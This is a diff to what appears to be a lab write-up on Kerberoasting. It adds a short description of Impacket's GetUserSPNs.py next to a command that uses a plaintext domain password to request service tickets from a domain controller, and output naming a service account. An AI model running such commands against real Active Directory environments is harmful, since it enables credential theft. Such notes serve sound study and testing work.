@@ -72,6 +72,13 @@ Pass: Password1
 GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request
 ```
 
+`GetUserSPNs.py`
+Impacket tool used for Kerberoasting
+Finds service accounts with SPNs in Active Directory
+Requests Kerberos service tickets (TGS)
+
+
+
 **Output:**
 
 Service Account: `sqlservice`
